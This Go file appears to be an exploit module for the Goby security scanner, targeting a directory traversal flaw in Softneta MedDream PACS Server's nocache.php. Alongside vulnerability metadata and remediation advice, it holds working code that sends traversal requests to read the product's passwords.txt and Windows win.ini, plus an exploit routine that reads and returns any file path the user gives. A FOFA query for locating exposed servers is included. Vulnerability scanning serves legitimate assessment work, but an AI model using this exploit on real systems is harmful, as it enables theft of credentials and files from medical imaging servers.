package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Softneta MedDream 6.7.11 Directory Traversal",
    "Description": "<p>Softneta specializes in medical imaging and communication solutions to improve the quality of healthcare. The company was founded in 2007 and possesses 14+ years of experience in the development of medical devices for processing, visualization and transmission of diagnostic medical data.</p><p>Softneta MedDream PACS Server Premium 6.7.1.1 nocache.php has Directory Traversal</p>",
    "Impact": "Softneta MedDream 6.7.11 Directory Traversal",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: https://www.softneta.com</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "MedDream",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "Softneta MedDream 6.7.11 版本 文件读取漏洞",
            "Description": "<p>Softneta 专注于医学成像和通信解决方案，以提高医疗保健质量。该公司成立于 2007 年，在用于处理、可视化和传输诊断医疗数据的医疗设备开发方面拥有 14 年以上的经验。</p><p>Softneta MedDream PACS Server Premium 6.7.1.1版本 nocache.php文件存在 文件读取漏洞</p>",
            "Impact": "<p>Softneta MedDream PACS Server Premium 6.7.1.1版本 nocache.php文件存在 文件读取漏洞。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.softneta.com/\">https://www.softneta.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "MedDream",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Softneta MedDream 6.7.11 Directory Traversal",
            "Description": "<p>Softneta specializes in medical imaging and communication solutions to improve the quality of healthcare. The company was founded in 2007 and possesses 14+ years of experience in the development of medical devices for processing, visualization and transmission of diagnostic medical data.</p><p>Softneta MedDream PACS Server Premium 6.7.1.1 nocache.php has Directory Traversal</p>",
            "Impact": "Softneta MedDream 6.7.11 Directory Traversal",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: https://www.softneta.com</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Product": "MedDream",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "body=\"MedDream\"",
    "GobyQuery": "body=\"MedDream\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.softneta.com/products/meddream-pacs-server/downloads.html",
    "DisclosureDate": "2018-05-23",
    "References": [
        "https://www.exploit-db.com/exploits/45347"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "createSelect",
            "value": "../../../../../../../../../../../../../../../../MedDreamPACS-Premium/passwords.txt,/../../../../../../Windows/win.ini",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "MedDream"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "8576"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/Pacs/nocache.php?path=../../../../../../../../../../../../../../../../MedDreamPACS-Premium/passwords.txt"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "MedDream") && strings.Contains(resp.RawBody, "password") {
					return true
				}
			}
			uri2 := "/Pacs/nocache.php?path=/../../../../../../Windows/win.ini"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "[fonts]") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/Pacs/nocache.php?path=" + url.QueryEscape(cmd)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
